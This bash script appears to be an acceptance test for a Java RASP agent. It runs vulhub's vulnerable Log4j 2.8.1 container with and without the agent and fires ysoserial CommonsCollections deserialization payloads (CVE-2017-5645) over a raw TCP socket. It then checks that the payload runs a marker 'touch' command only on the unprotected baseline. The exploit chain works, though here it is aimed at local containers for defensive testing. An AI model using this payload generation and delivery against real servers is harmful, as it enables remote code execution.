#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
gradle_cache_dir=""

source scripts/lib/ysoserial.sh

gradle_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/ohmyrasp-gradle-cache-log4j5645.XXXXXX")"
docker run --rm -u "$(id -u):$(id -g)" -e HOME=/tmp/gradle-home -e GRADLE_USER_HOME=/tmp/gradle-cache -v "${gradle_cache_dir}:/tmp/gradle-cache" -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_LOG4J_5645_IMAGE:-vulhub/log4j:2.8.1}"
baseline_name="${OHMYRASP_VULHUB_LOG4J_5645_BASELINE_NAME:-ohmyrasp-vulhub-log4j5645-baseline}"
protected_name="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_NAME:-ohmyrasp-vulhub-log4j5645-protected}"
baseline_port="${OHMYRASP_VULHUB_LOG4J_5645_BASELINE_PORT:-19172}"
protected_port="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_PORT:-19173}"
payload_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
ysoserial_jar="${payload_dir}/ysoserial.jar"
payload_gadgets=(
  CommonsCollections5
  CommonsCollections6
  CommonsCollections7
)
success_file="/tmp/ohmyrasp-log4j5645-success"
baseline_dir="logs/vulhub-log4j-2017-5645-java8-baseline"
protected_dir="logs/vulhub-log4j-2017-5645-java8-protected"
protected_log="${protected_dir}/events.jsonl"
verified_gadget=""
verified_payload_file=""

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  if [[ -n "${gradle_cache_dir:-}" ]]; then
    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

payload_file_for_gadget() {
  local gadget="$1"
  printf '%s/log4j-5645-%s-touch.ser' "$payload_dir" "$gadget"
}

prepare_payload() {
  # shellcheck source=scripts/lib/ysoserial.sh
  source scripts/lib/ysoserial.sh
  prepare_ysoserial_jar "$ysoserial_jar"

  for gadget in "${payload_gadgets[@]}"; do
    local payload_file
    payload_file="$(payload_file_for_gadget "$gadget")"
    docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
      bash -lc "/usr/local/openjdk-8/bin/java -jar ysoserial.jar ${gadget} 'touch ${success_file}' > /work/$(basename "$payload_file") && test -s /work/$(basename "$payload_file")"
  done
}

wait_for_tcp_server() {
  local name="$1"
  local port="$2"
  local dir="$3"

  for attempt in $(seq 1 60); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
      printf 'tcp_ready_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose Log4j TCP SocketServer on ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  echo "missing Java8 agent startup event for Log4j CVE-2017-5645" >&2
  exit 1
}

send_payload() {
  local port="$1"
  local dir="$2"
  local payload_file="$3"
  local gadget="$4"
  if cat "$payload_file" > "/dev/tcp/127.0.0.1/${port}"; then
    printf 'payload_gadget=%s payload_file=%s payload_send_status=ok\n' "$gadget" "$(basename "$payload_file")" >> "${dir}/attempts.log"
  else
    printf 'payload_gadget=%s payload_file=%s payload_send_status=connection_closed\n' "$gadget" "$(basename "$payload_file")" >> "${dir}/attempts.log"
  fi
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:4712" \
    "$image" >/dev/null
  wait_for_tcp_server "$baseline_name" "$baseline_port" "$baseline_dir"
}

start_protected() {
  docker run -d --name "$protected_name" \
    -p "${protected_port}:4712" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null
  wait_for_tcp_server "$protected_name" "$protected_port" "$protected_dir"
  wait_for_protected_startup
}

run_baseline() {
  start_baseline

  for gadget in "${payload_gadgets[@]}"; do
    local payload_file
    payload_file="$(payload_file_for_gadget "$gadget")"
    for exploit_attempt in $(seq 1 3); do
      docker exec "$baseline_name" rm -f "$success_file"
      send_payload "$baseline_port" "$baseline_dir" "$payload_file" "$gadget"
      for marker_attempt in $(seq 1 5); do
        if docker exec "$baseline_name" test -e "$success_file"; then
          verified_gadget="$gadget"
          verified_payload_file="$payload_file"
          printf 'baseline_gadget=%s baseline_exploit_attempt=%s baseline_marker_attempt=%s\n' "$gadget" "$exploit_attempt" "$marker_attempt" >> "${baseline_dir}/attempts.log"
          copy_artifacts "$baseline_name" "$baseline_dir"
          docker rm -f "$baseline_name" >/dev/null 2>&1 || true
          return
        fi
        sleep 1
      done
      sleep 1
    done
  done

  docker logs "$baseline_name" >&2 || true
  echo "baseline Log4j CVE-2017-5645 did not execute any ysoserial payload (${payload_gadgets[*]})" >&2
  exit 1
}

run_protected() {
  start_protected
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Log4j container produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  if [[ -z "$verified_payload_file" || -z "$verified_gadget" ]]; then
    verified_gadget="${payload_gadgets[0]}"
    verified_payload_file="$(payload_file_for_gadget "$verified_gadget")"
  fi
  send_payload "$protected_port" "$protected_dir" "$verified_payload_file" "$verified_gadget"
  for attempt in $(seq 1 10); do
    if grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
      printf 'protected_block_gadget=%s protected_block_attempt=%s\n' "$verified_gadget" "$attempt" >> "${protected_dir}/attempts.log"
      break
    fi
    sleep 1
  done

  if docker exec "$protected_name" test -e "$success_file"; then
    echo "protected Log4j CVE-2017-5645 created ${success_file} despite Java8 RASP" >&2
    exit 1
  fi
  if ! grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    echo "missing java8_deserialization_gadget_class block event for Log4j CVE-2017-5645" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_payload
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Log4j CVE-2017-5645 Java8 acceptance passed"
